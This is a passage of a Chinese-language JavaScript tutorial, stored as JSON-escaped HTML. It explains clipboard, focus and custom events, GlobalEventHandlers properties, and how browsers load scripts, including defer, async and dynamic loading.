对象，存放剪贴的数据。具体的 API 接口和操作方法，请参见《触摸事件》的 DataTransfer 对象部分。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.addEventListener(&#039;copy&#039;, function (e) {\n  e.clipboardData.setData(&#039;text/plain&#039;, &#039;Hello, world!&#039;);\n  e.clipboardData.setData(&#039;text/html&#039;, &#039;&lt;b&gt;Hello, world!&lt;/b&gt;&#039;);\n  e.preventDefault();\n});</code></pre><p>上面的代码使得复制进入剪贴板的，都是开发者指定的数据，而不是用户想要拷贝的数据。</p>\n\n        <h2>\n            <a href='#焦点事件' class='header-anchor'>#</a>\n            <span>焦点事件</span>\n        </h2>\n    <p>焦点事件发生在元素节点和<code>document</code>对象上面，与获得或失去焦点相关。它主要包括以下四个事件。</p>\n<ul>\n<li><code>focus</code>：元素节点获得焦点后触发，该事件不会冒泡。</li>\n<li><code>blur</code>：元素节点失去焦点后触发，该事件不会冒泡。</li>\n<li><code>focusin</code>：元素节点将要获得焦点时触发，发生在<code>focus</code>事件之前。该事件会冒泡。</li>\n<li><code>focusout</code>：元素节点将要失去焦点时触发，发生在<code>blur</code>事件之前。该事件会冒泡。</li>\n</ul>\n<p>这四个事件都继承了<code>FocusEvent</code>接口。<code>FocusEvent</code>实例具有以下属性。</p>\n<ul>\n<li><code>FocusEvent.target</code>：事件的目标节点。</li>\n<li><code>FocusEvent.relatedTarget</code>：对于<code>focusin</code>事件，返回失去焦点的节点；对于<code>focusout</code>事件，返回将要接受焦点的节点；对于<code>focus</code>和<code>blur</code>事件，返回<code>null</code>。</li>\n</ul>\n<p>由于<code>focus</code>和<code>blur</code>事件不会冒泡，只能在捕获阶段触发，所以<code>addEventListener</code>方法的第三个参数需要设为<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>form.addEventListener(&#039;focus&#039;, function (event) {\n  event.target.style.background = &#039;pink&#039;;\n}, true);\n\nform.addEventListener(&#039;blur&#039;, function (event) {\n  event.target.style.background = &#039;&#039;;\n}, true);</code></pre><p>上面代码针对表单的文本输入框，接受焦点时设置背景色，失去焦点时去除背景色。</p>\n\n        <h2>\n            <a href='#CustomEvent-接口' class='header-anchor'>#</a>\n            <span>CustomEvent 接口</span>\n        </h2>\n    <p>CustomEvent 接口用于生成自定义的事件实例。那些浏览器预定义的事件，虽然可以手动生成，但是往往不能在事件上绑定数据。如果需要在触发事件的同时，传入指定的数据，就可以使用 CustomEvent 接口生成的自定义事件对象。</p>\n<p>浏览器原生提供<code>CustomEvent()</code>构造函数，用来生成 CustomEvent 事件实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>new CustomEvent(type, options)</code></pre><p><code>CustomEvent()</code>构造函数接受两个参数。第一个参数是字符串，表示事件的名字，这是必须的。第二个参数是事件的配置对象，这个参数是可选的。<code>CustomEvent</code>的配置对象除了接受 Event 事件的配置属性，只有一个自己的属性。</p>\n<ul>\n<li><code>detail</code>：表示事件的附带数据，默认为<code>null</code>。</li>\n</ul>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var event = new CustomEvent(&#039;build&#039;, { &#039;detail&#039;: &#039;hello&#039; });\n\nfunction eventHandler(e) {\n  console.log(e.detail);\n}\n\ndocument.body.addEventListener(&#039;build&#039;, function (e) {\n  console.log(e.detail);\n});\n\ndocument.body.dispatchEvent(event);</code></pre><p>上面代码中，我们手动定义了<code>build</code>事件。该事件触发后，会被监听到，从而输出该事件实例的<code>detail</code>属性（即字符串<code>hello</code>）。</p>\n<p>下面是另一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var myEvent = new CustomEvent(&#039;myevent&#039;, {\n  detail: {\n    foo: &#039;bar&#039;\n  },\n  bubbles: true,\n  cancelable: false\n});\n\nel.addEventListener(&#039;myevent&#039;, function (event) {\n  console.log(&#039;Hello &#039; + event.detail.foo);\n});\n\nel.dispatchEvent(myEvent);</code></pre><p>上面代码也说明，CustomEvent 的事件实例，除了具有 Event 接口的实例属性，还具有<code>detail</code>属性。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"事件","link":"javascript:void(0)"},{"title":"拖拉事件","link":"/events/globaleventhandlers.html"}],"content":"\n        <h1>\n            <a href='#GlobalEventHandlers-接口' class='header-anchor'>#</a>\n            <span>GlobalEventHandlers 接口</span>\n        </h1>\n    <p>指定事件的回调函数，推荐使用的方法是元素的<code>addEventListener</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>div.addEventListener(&#039;click&#039;, clickHandler, false);</code></pre><p>除了之外，还有一种方法可以直接指定事件的回调函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>div.onclick = clickHandler;</code></pre><p>这个接口是由<code>GlobalEventHandlers</code>接口提供的。它的优点是使用比较方便，缺点是只能为每个事件指定一个回调函数，并且无法指定事件触发的阶段（捕获阶段还是冒泡阶段）。</p>\n<p><code>HTMLElement</code>、<code>Document</code>和<code>Window</code>都继承了这个接口，也就是说，各种 HTML 元素、<code>document</code>对象、<code>window</code>对象上面都可以使用<code>GlobalEventHandlers</code>接口提供的属性。下面就列出这个接口提供的主要的事件属性。</p>\n\n        <h2>\n            <a href='#GlobalEventHandlers.onabort' class='header-anchor'>#</a>\n            <span>GlobalEventHandlers.onabort</span>\n        </h2>\n    <p>某个对象的<code>abort</code>事件（停止加载）发生时，就会调用<code>onabort</code>属性指定的回调函数。</p>\n<p>各种元素的停止加载事件，到底如何触发，目前并没有统一的规定。因此实际上，这个属性现在一般只用在<code>&lt;img&gt;</code>元素上面。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;img src=&quot;example.jpg&quot; id=&quot;img&quot;&gt;\nvar img = document.getElementById(&#039;img&#039;);\nimg.onabort = function () {\n  console.log(&#039;image load aborted.&#039;);\n}</code></pre>\n        <h2>\n            <a href='#GlobalEventHandlers.onerror' class='header-anchor'>#</a>\n            <span>GlobalEventHandlers.onerror</span>\n        </h2>\n    <p><code>error</code>事件发生时，就会调用<code>onerror</code>属性指定的回调函数。</p>\n<p><code>error</code>事件分成两种。</p>\n<p>一种是 JavaScript 的运行时错误，这会传到<code>window</code>对象，导致<code>window.onerror()</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.onerror = function (message, source, lineno, colno, error) {\n  // ...\n}</code></pre><p><code>window.onerror</code>的处理函数共接受五个参数，含义如下。</p>\n<ul>\n<li>message：错误信息字符串</li>\n<li>source：报错脚本的 URL</li>\n<li>lineno：报错的行号，是一个整数</li>\n<li>colno：报错的列号，是一个整数</li>\n<li>error： 错误对象</li>\n</ul>\n<p>另一种是资源加载错误，比如<code>&lt;img&gt;</code>或<code>&lt;script&gt;</code>加载的资源出现加载错误。这时，Error 对象会传到对应的元素，导致该元素的<code>onerror</code>属性开始执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>element.onerror = function (event) {\n  // ...\n}</code></pre><p>注意，一般来说，资源的加载错误不会触发<code>window.onerror</code>。</p>\n\n        <h2>\n            <a href='#GlobalEventHandlers.onload、GlobalEventHandlers.onloadstart' class='header-anchor'>#</a>\n            <span>GlobalEventHandlers.onload、GlobalEventHandlers.onloadstart</span>\n        </h2>\n    <p>元素完成加载时，会触发<code>load</code>事件，执行<code>onload()</code>。它的典型使用场景是<code>window</code>对象和<code>&lt;img&gt;</code>元素。对于<code>window</code>对象来说，只有页面的所有资源加载完成（包括图片、脚本、样式表、字体等所有外部资源），才会触发<code>load</code>事件。</p>\n<p>对于<code>&lt;img&gt;</code>和<code>&lt;video&gt;</code>等元素，加载开始时还会触发<code>loadstart</code>事件，导致执行<code>onloadstart</code>。</p>\n\n        <h2>\n            <a href='#GlobalEventHandlers.onfocus，GlobalEventHandlers.onblur' class='header-anchor'>#</a>\n            <span>GlobalEventHandlers.onfocus，GlobalEventHandlers.onblur</span>\n        </h2>\n    <p>当前元素获得焦点时，会触发<code>element.onfocus</code>；失去焦点时，会触发<code>element.onblur</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>element.onfocus = function () {\n  console.log(&quot;onfocus event detected!&quot;);\n};\nelement.onblur = function () {\n  console.log(&quot;onblur event detected!&quot;);\n};</code></pre><p>注意，如果不是可以接受用户输入的元素，要触发<code>onfocus</code>，该元素必须有<code>tabindex</code>属性。</p>\n\n        <h2>\n            <a href='#GlobalEventHandlers.onscroll' class='header-anchor'>#</a>\n            <span>GlobalEventHandlers.onscroll</span>\n        </h2>\n    <p>页面或元素滚动时，会触发<code>scroll</code>事件，导致执行<code>onscroll()</code>。</p>\n\n        <h2>\n            <a href='#GlobalEventHandlers.oncontextmenu，GlobalEventHandlers.onshow' class='header-anchor'>#</a>\n            <span>GlobalEventHandlers.oncontextmenu，GlobalEventHandlers.onshow</span>\n        </h2>\n    <p>用户在页面上按下鼠标的右键，会触发<code>contextmenu</code>事件，导致执行<code>oncontextmenu()</code>。如果该属性执行后返回<code>false</code>，就等于禁止了右键菜单。<code>document.oncontextmenu</code>与<code>window.oncontextmenu</code>效果一样。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.oncontextmenu = function () {\n  return false;\n};</code></pre><p>上面代码中，<code>oncontextmenu</code>属性执行后返回<code>false</code>，右键菜单就不会出现。</p>\n<p>元素的右键菜单显示时，会触发该元素的<code>onshow</code>监听函数。</p>\n\n        <h2>\n            <a href='#其他的事件属性' class='header-anchor'>#</a>\n            <span>其他的事件属性</span>\n        </h2>\n    <p>鼠标的事件属性。</p>\n<ul>\n<li>onclick</li>\n<li>ondblclick</li>\n<li>onmousedown</li>\n<li>onmouseenter</li>\n<li>onmouseleave</li>\n<li>onmousemove</li>\n<li>onmouseout</li>\n<li>onmouseover</li>\n<li>onmouseup</li>\n<li>onwheel</li>\n</ul>\n<p>键盘的事件属性。</p>\n<ul>\n<li>onkeydown</li>\n<li>onkeypress</li>\n<li>onkeyup</li>\n</ul>\n<p>焦点的事件属性。</p>\n<ul>\n<li>onblur</li>\n<li>onfocus</li>\n</ul>\n<p>表单的事件属性。</p>\n<ul>\n<li>oninput</li>\n<li>onchange</li>\n<li>onsubmit</li>\n<li>onreset</li>\n<li>oninvalid</li>\n<li>onselect</li>\n</ul>\n<p>触摸的事件属性。</p>\n<ul>\n<li>ontouchcancel</li>\n<li>ontouchend</li>\n<li>ontouchmove</li>\n<li>ontouchstart</li>\n</ul>\n<p>拖动的事件属性分成两类：一类与被拖动元素相关，另一类与接收被拖动元素的容器元素相关。</p>\n<p>被拖动元素的事件属性。</p>\n<ul>\n<li>ondragstart：拖动开始</li>\n<li>ondrag：拖动过程中，每隔几百毫秒触发一次</li>\n<li>ondragend：拖动结束</li>\n</ul>\n<p>接收被拖动元素的容器元素的事件属性。</p>\n<ul>\n<li>ondragenter：被拖动元素进入容器元素。</li>\n<li>ondragleave：被拖动元素离开容器元素。</li>\n<li>ondragover：被拖动元素在容器元素上方，每隔几百毫秒触发一次。</li>\n<li>ondrop：松开鼠标后，被拖动元素放入容器元素。</li>\n</ul>\n<p><code>&lt;dialog&gt;</code>对话框元素的事件属性。</p>\n<ul>\n<li>oncancel</li>\n<li>onclose</li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"浏览器模型","link":"javascript:void(0)"},{"title":"浏览器环境概述","link":"/bom/engine.html"}],"content":"\n        <h1>\n            <a href='#浏览器环境概述' class='header-anchor'>#</a>\n            <span>浏览器环境概述</span>\n        </h1>\n    <p>JavaScript 是浏览器的内置脚本语言。也就是说，浏览器内置了 JavaScript 引擎，并且提供各种接口，让 JavaScript 脚本可以控制浏览器的各种功能。一旦网页内嵌了 JavaScript 脚本，浏览器加载网页，就会去执行脚本，从而达到操作浏览器的目的，实现网页的各种动态效果。</p>\n<p>本章开始介绍浏览器提供的各种 JavaScript 接口。首先，介绍 JavaScript 代码嵌入网页的方法。</p>\n\n        <h2>\n            <a href='#代码嵌入网页的方法' class='header-anchor'>#</a>\n            <span>代码嵌入网页的方法</span>\n        </h2>\n    <p>网页中嵌入 JavaScript 代码，主要有三种方法。</p>\n<ul>\n<li><code>&lt;script&gt;</code>元素直接嵌入代码。</li>\n<li><code>&lt;script&gt;</code>标签加载外部脚本</li>\n<li>事件属性</li>\n<li>URL 协议</li>\n</ul>\n\n        <h3>\n            <a href='#script-元素嵌入代码' class='header-anchor'>#</a>\n            <span>script 元素嵌入代码</span>\n        </h3>\n    <p><code>&lt;script&gt;</code>元素内部可以直接写 JavaScript 代码。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script&gt;\n  var x = 1 + 5;\n  console.log(x);\n&lt;/script&gt;</code></pre><p><code>&lt;script&gt;</code>标签有一个<code>type</code>属性，用来指定脚本类型。对 JavaScript 脚本来说，<code>type</code>属性可以设为两种值。</p>\n<ul>\n<li><code>text/javascript</code>：这是默认值，也是历史上一贯设定的值。如果你省略<code>type</code>属性，默认就是这个值。对于老式浏览器，设为这个值比较好。</li>\n<li><code>application/javascript</code>：对于较新的浏览器，建议设为这个值。</li>\n</ul>\n<pre class=\"prettyprint language-html\"><code>&lt;script type=&quot;application/javascript&quot;&gt;\n  console.log(&#039;Hello World&#039;);\n&lt;/script&gt;</code></pre><p>由于<code>&lt;script&gt;</code>标签默认就是 JavaScript 代码。所以，嵌入 JavaScript 脚本时，<code>type</code>属性可以省略。</p>\n<p>如果<code>type</code>属性的值，浏览器不认识，那么它不会执行其中的代码。利用这一点，可以在<code>&lt;script&gt;</code>标签之中嵌入任意的文本内容，只要加上一个浏览器不认识的<code>type</code>属性即可。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script id=&quot;mydata&quot; type=&quot;x-custom-data&quot;&gt;\n  console.log(&#039;Hello World&#039;);\n&lt;/script&gt;</code></pre><p>上面的代码，浏览器不会执行，也不会显示它的内容，因为不认识它的<code>type</code>属性。但是，这个<code>&lt;script&gt;</code>节点依然存在于 DOM 之中，可以使用<code>&lt;script&gt;</code>节点的<code>text</code>属性读出它的内容。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.getElementById(&#039;mydata&#039;).text\n//   console.log(&#039;Hello World&#039;);</code></pre>\n        <h3>\n            <a href='#script-元素加载外部脚本' class='header-anchor'>#</a>\n            <span>script 元素加载外部脚本</span>\n        </h3>\n    <p><code>&lt;script&gt;</code>标签也可以指定加载外部的脚本文件。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script src=&quot;https://www.example.com/script.js&quot;&gt;&lt;/script&gt;</code></pre><p>如果脚本文件使用了非英语字符，还应该注明字符的编码。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script charset=&quot;utf-8&quot; src=&quot;https://www.example.com/script.js&quot;&gt;&lt;/script&gt;</code></pre><p>所加载的脚本必须是纯的 JavaScript 代码，不能有<code>HTML</code>代码和<code>&lt;script&gt;</code>标签。</p>\n<p>加载外部脚本和直接添加代码块，这两种方法不能混用。下面代码的<code>console.log</code>语句直接被忽略。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script charset=&quot;utf-8&quot; src=&quot;example.js&quot;&gt;\n  console.log(&#039;Hello World!&#039;);\n&lt;/script&gt;</code></pre><p>为了防止攻击者篡改外部脚本，<code>script</code>标签允许设置一个<code>integrity</code>属性，写入该外部脚本的 Hash 签名，用来验证脚本的一致性。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script src=&quot;/assets/application.js&quot;\n  integrity=&quot;sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs=&quot;&gt;\n&lt;/script&gt;</code></pre><p>上面代码中，<code>script</code>标签有一个<code>integrity</code>属性，指定了外部脚本<code>/assets/application.js</code>的 SHA256 签名。一旦有人改了这个脚本，导致 SHA256 签名不匹配，浏览器就会拒绝加载。</p>\n\n        <h3>\n            <a href='#事件属性' class='header-anchor'>#</a>\n            <span>事件属性</span>\n        </h3>\n    <p>网页元素的事件属性（比如<code>onclick</code>和<code>onmouseover</code>），可以写入 JavaScript 代码。当指定事件发生时，就会调用这些代码。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;button id=&quot;myBtn&quot; onclick=&quot;console.log(this.id)&quot;&gt;点击&lt;/button&gt;</code></pre><p>上面的事件属性代码只有一个语句。如果有多个语句，使用分号分隔即可。</p>\n\n        <h3>\n            <a href='#URL-协议' class='header-anchor'>#</a>\n            <span>URL 协议</span>\n        </h3>\n    <p>URL 支持<code>javascript:</code>协议，即在 URL 的位置写入代码，使用这个 URL 的时候就会执行 JavaScript 代码。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;a href=&quot;javascript:console.log(&#039;Hello&#039;)&quot;&gt;点击&lt;/a&gt;</code></pre><p>浏览器的地址栏也可以执行<code>javascipt:</code>协议。将<code>javascript:console.log(&#39;Hello&#39;)</code>放入地址栏，按回车键也会执行这段代码。</p>\n<p>如果 JavaScript 代码返回一个字符串，浏览器就会新建一个文档，展示这个字符串的内容，原有文档的内容都会消失。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;a href=&quot;javascript: new Date().toLocaleTimeString();&quot;&gt;点击&lt;/a&gt;</code></pre><p>上面代码中，用户点击链接以后，会打开一个新文档，里面有当前时间。</p>\n<p>如果返回的不是字符串，那么浏览器不会新建文档，也不会跳转。</p>\n<pre class=\"prettyprint language-javascript\"><code>&lt;a href=&quot;javascript: console.log(new Date().toLocaleTimeString())&quot;&gt;点击&lt;/a&gt;</code></pre><p>上面代码中，用户点击链接后，网页不会跳转，只会在控制台显示当前时间。</p>\n<p><code>javascript:</code>协议的常见用途是书签脚本 Bookmarklet。由于浏览器的书签保存的是一个网址，所以<code>javascript:</code>网址也可以保存在里面，用户选择这个书签的时候，就会在当前页面执行这个脚本。为了防止书签替换掉当前文档，可以在脚本前加上<code>void</code>，或者在脚本最后加上<code>void 0</code>。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;a href=&quot;javascript: void new Date().toLocaleTimeString();&quot;&gt;点击&lt;/a&gt;\n&lt;a href=&quot;javascript: new Date().toLocaleTimeString();void 0;&quot;&gt;点击&lt;/a&gt;</code></pre><p>上面这两种写法，点击链接后，执行代码都不会网页跳转。</p>\n\n        <h2>\n            <a href='#script-元素' class='header-anchor'>#</a>\n            <span>script 元素</span>\n        </h2>\n    \n        <h3>\n            <a href='#工作原理' class='header-anchor'>#</a>\n            <span>工作原理</span>\n        </h3>\n    <p>浏览器加载 JavaScript 脚本，主要通过<code>&lt;script&gt;</code>元素完成。正常的网页加载流程是这样的。</p>\n<ol>\n<li>浏览器一边下载 HTML 网页，一边开始解析。也就是说，不等到下载完，就开始解析。</li>\n<li>解析过程中，浏览器发现<code>&lt;script&gt;</code>元素，就暂停解析，把网页渲染的控制权转交给 JavaScript 引擎。</li>\n<li>如果<code>&lt;script&gt;</code>元素引用了外部脚本，就下载该脚本再执行，否则就直接执行代码。</li>\n<li>JavaScript 引擎执行完毕，控制权交还渲染引擎，恢复往下解析 HTML 网页。</li>\n</ol>\n<p>加载外部脚本时，浏览器会暂停页面渲染，等待脚本下载并执行完成后，再继续渲染。原因是 JavaScript 代码可以修改 DOM，所以必须把控制权让给它，否则会导致复杂的线程竞赛的问题。</p>\n<p>如果外部脚本加载时间很长（一直无法完成下载），那么浏览器就会一直等待脚本下载完成，造成网页长时间失去响应，浏览器就会呈现“假死”状态，这被称为“阻塞效应”。</p>\n<p>为了避免这种情况，较好的做法是将<code>&lt;script&gt;</code>标签都放在页面底部，而不是头部。这样即使遇到脚本失去响应，网页主体的渲染也已经完成了，用户至少可以看到内容，而不是面对一张空白的页面。如果某些脚本代码非常重要，一定要放在页面头部的话，最好直接将代码写入页面，而不是连接外部脚本文件，这样能缩短加载时间。</p>\n<p>脚本文件都放在网页尾部加载，还有一个好处。因为在 DOM 结构生成之前就调用 DOM 节点，JavaScript 会报错，如果脚本都在网页尾部加载，就不存在这个问题，因为这时 DOM 肯定已经生成了。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;head&gt;\n  &lt;script&gt;\n    console.log(document.body.innerHTML);\n  &lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;/body&gt;</code></pre><p>上面代码执行时会报错，因为此时<code>document.body</code>元素还未生成。</p>\n<p>一种解决方法是设定<code>DOMContentLoaded</code>事件的回调函数。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;head&gt;\n  &lt;script&gt;\n    document.addEventListener(\n      &#039;DOMContentLoaded&#039;,\n      function (event) {\n        console.log(document.body.innerHTML);\n      }\n    );\n  &lt;/script&gt;\n&lt;/head&gt;</code></pre><p>上面代码中，指定<code>DOMContentLoaded</code>事件发生后，才开始执行相关代码。<code>DOMContentLoaded</code>事件只有在 DOM 结构生成之后才会触发。</p>\n<p>另一种解决方法是，使用<code>&lt;script&gt;</code>标签的<code>onload</code>属性。当<code>&lt;script&gt;</code>标签指定的外部脚本文件下载和解析完成，会触发一个<code>load</code>事件，可以把所需执行的代码，放在这个事件的回调函数里面。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script src=&quot;jquery.min.js&quot; onload=&quot;console.log(document.body.innerHTML)&quot;&gt;\n&lt;/script&gt;</code></pre><p>但是，如果将脚本放在页面底部，就可以完全按照正常的方式写，上面两种方式都不需要。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;body&gt;\n  &lt;!-- 其他代码  --&gt;\n  &lt;script&gt;\n    console.log(document.body.innerHTML);\n  &lt;/script&gt;\n&lt;/body&gt;</code></pre><p>如果有多个<code>script</code>标签，比如下面这样。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script src=&quot;a.js&quot;&gt;&lt;/script&gt;\n&lt;script src=&quot;b.js&quot;&gt;&lt;/script&gt;</code></pre><p>浏览器会同时并行下载<code>a.js</code>和<code>b.js</code>，但是，执行时会保证先执行<code>a.js</code>，然后再执行<code>b.js</code>，即使后者先下载完成，也是如此。也就是说，脚本的执行顺序由它们在页面中的出现顺序决定，这是为了保证脚本之间的依赖关系不受到破坏。当然，加载这两个脚本都会产生“阻塞效应”，必须等到它们都加载完成，浏览器才会继续页面渲染。</p>\n<p>解析和执行 CSS，也会产生阻塞。Firefox 浏览器会等到脚本前面的所有样式表，都下载并解析完，再执行脚本；Webkit则是一旦发现脚本引用了样式，就会暂停执行脚本，等到样式表下载并解析完，再恢复执行。</p>\n<p>此外，对于来自同一个域名的资源，比如脚本文件、样式表文件、图片文件等，浏览器一般有限制，同时最多下载6～20个资源，即最多同时打开的 TCP 连接有限制，这是为了防止对服务器造成太大压力。如果是来自不同域名的资源，就没有这个限制。所以，通常把静态文件放在不同的域名之下，以加快下载速度。</p>\n\n        <h3>\n            <a href='#defer-属性' class='header-anchor'>#</a>\n            <span>defer 属性</span>\n        </h3>\n    <p>为了解决脚本文件下载阻塞网页渲染的问题，一个方法是对<code>&lt;script&gt;</code>元素加入<code>defer</code>属性。它的作用是延迟脚本的执行，等到 DOM 加载生成后，再执行脚本。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script src=&quot;a.js&quot; defer&gt;&lt;/script&gt;\n&lt;script src=&quot;b.js&quot; defer&gt;&lt;/script&gt;</code></pre><p>上面代码中，只有等到 DOM 加载完成后，才会执行<code>a.js</code>和<code>b.js</code>。</p>\n<p><code>defer</code>属性的运行流程如下。</p>\n<ol>\n<li>浏览器开始解析 HTML 网页。</li>\n<li>解析过程中，发现带有<code>defer</code>属性的<code>&lt;script&gt;</code>元素。</li>\n<li>浏览器继续往下解析 HTML 网页，同时并行下载<code>&lt;script&gt;</code>元素加载的外部脚本。</li>\n<li>浏览器完成解析 HTML 网页，此时再回过头执行已经下载完成的脚本。</li>\n</ol>\n<p>有了<code>defer</code>属性，浏览器下载脚本文件的时候，不会阻塞页面渲染。下载的脚本文件在<code>DOMContentLoaded</code>事件触发前执行（即刚刚读取完<code>&lt;/html&gt;</code>标签），而且可以保证执行顺序就是它们在页面上出现的顺序。</p>\n<p>对于内置而不是加载外部脚本的<code>script</code>标签，以及动态生成的<code>script</code>标签，<code>defer</code>属性不起作用。另外，使用<code>defer</code>加载的外部脚本不应该使用<code>document.write</code>方法。</p>\n\n        <h3>\n            <a href='#async-属性' class='header-anchor'>#</a>\n            <span>async 属性</span>\n        </h3>\n    <p>解决“阻塞效应”的另一个方法是对<code>&lt;script&gt;</code>元素加入<code>async</code>属性。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script src=&quot;a.js&quot; async&gt;&lt;/script&gt;\n&lt;script src=&quot;b.js&quot; async&gt;&lt;/script&gt;</code></pre><p><code>async</code>属性的作用是，使用另一个进程下载脚本，下载时不会阻塞渲染。</p>\n<ol>\n<li>浏览器开始解析 HTML 网页。</li>\n<li>解析过程中，发现带有<code>async</code>属性的<code>script</code>标签。</li>\n<li>浏览器继续往下解析 HTML 网页，同时并行下载<code>&lt;script&gt;</code>标签中的外部脚本。</li>\n<li>脚本下载完成，浏览器暂停解析 HTML 网页，开始执行下载的脚本。</li>\n<li>脚本执行完毕，浏览器恢复解析 HTML 网页。</li>\n</ol>\n<p><code>async</code>属性可以保证脚本下载的同时，浏览器继续渲染。需要注意的是，一旦采用这个属性，就无法保证脚本的执行顺序。哪个脚本先下载结束，就先执行那个脚本。另外，使用<code>async</code>属性的脚本文件里面的代码，不应该使用<code>document.write</code>方法。</p>\n<p><code>defer</code>属性和<code>async</code>属性到底应该使用哪一个？</p>\n<p>一般来说，如果脚本之间没有依赖关系，就使用<code>async</code>属性，如果脚本之间有依赖关系，就使用<code>defer</code>属性。如果同时使用<code>async</code>和<code>defer</code>属性，后者不起作用，浏览器行为由<code>async</code>属性决定。</p>\n\n        <h3>\n            <a href='#脚本的动态加载' class='header-anchor'>#</a>\n            <span>脚本的动态加载</span>\n        </h3>\n    <p><code>&lt;script&gt;</code>元素还可以动态生成，生成后再插入页面，从而实现脚本的动态加载。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;a.js&#039;, &#039;b.js&#039;].forEach(function(src) {\n  var script = document.createElement(&#039;script&#039;);\n  script.src = src;\n  document.head.appendChild(script);\n});</code></pre><p>这种方法的好处是，动态生成的<code>script</code>标签不会阻塞页面渲染，也就不会造成浏览器假死。但是问题在于，这种方法无法保证脚本的执行顺序，哪个脚本文件先下载完成，就先执行哪个。</p>\n<p>如果想避免这个问题，可以设置async属性为<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;a.js&#039;, &#039;b.js&#039;].forEach(function(src) {\n  var script = document.createElement(&#039;script&#039;);\n  script.src = src;\n  script.async = false;\n  document.head.appendChild(script);\n});</code></pre><p>上面的代码不会阻塞页面渲染，而且可以保证<code>b.js</code>在<code>a.js</code>后面执行。不过需要注意的是，在这段代码后面加载的脚本文件，会因此都等待<code>b.js</code>执行完成后再执行。</p>\n<p>如果想为动态加载的脚本指定回调函数，可以使用下面的写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>function loadScript(src, done) {\n  var js = document.createElement(&#039;script&#039;);\n  js.src = src;\n  js.onload = function() {\n    done();\n  };\n  js.onerror = function() {\n    done(new Error(&#039;Failed to load script &#039; + src));\n  };\n  document.head.appendChild(js);\n}</code></pre>\n        <h3>\n            <a href='#加载使用的协议' class='header-anchor'>#</a>\n            <span>加载使用的协议</span>\n        </h3>\n    <p>如果不指定协议，浏览器默认采用 HTTP 协议下载。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script src=&quot;example.js&quot;&gt;&lt;/script&gt;</code></pre><p>上面的<code>example.js</code>默认就是采用 HTTP 协议下载，如果要采用 HTTPS 协议下载，必需写明。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script src=&quot;https://example.js&quot;&gt;&lt;/script&gt;</code></pre><p>但是有时我们会希望，根据页面本身的协议来决定加载协议，这时可以采用下面的写法。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script src=&quot;//example.js&quot;&gt;&lt;/script&gt;</code></pre>\n        <h2>\n            <a href='#浏览器的组成' class='header-anchor'>#</a>\n            <span>浏览器的组成</span>\n        </h2>\n    <p>浏览器的核心是两部分：渲染引擎和 JavaScript 解释器（又称 JavaScript 引擎）。</p>\n\n        <h3>\n            <a href='#渲染引擎' class='header-anchor'>#</a>\n            <span>渲染引擎</span>\n        </h3>\n    <p>渲染引擎的主要作用是，将网页代码渲染为用户视觉可以感知的平面文档。</p>\n<p>不同的浏览器有不同的渲染引擎。</p>\n<ul>\n<li>Firefox：Gecko 引擎</li>\n<li>Safari：WebKit 引擎</li>\n<li>Chrome：Blink 引擎</li>\n<li>IE: Trident 引擎</li>\n<li>Edge: EdgeHTML 引擎</li>\n</ul>\n<p>渲染引擎处理网页，通常分成四个阶段。</p>\n<ol>\n<li>解析代码：HTML 代码解析为 DOM，CSS 代码解析为 CSSOM（CSS Object Model）。</li>\n<li>对象合成：将 DOM 和 CSSOM 合成一棵渲染树（render tree）。</li>\n<li>布局：计算出渲染树的布局（layout）。</li>\n<li>绘制：将渲染树绘制到屏幕。</li>\n</ol>\n<p>以上四步并非严格按顺序执行，往往第一步还没完成，第二步和第三步就已经开始了。所以，会看到这种情况：网页的 HTML 代码还没下载完，但浏览器已经显示出内容了。</p>\n\n        <h3>\n            <a href='#重流和重绘' class='header-anchor'>#</a>\n            <span>重流和重绘</span>\n        </h3>\n    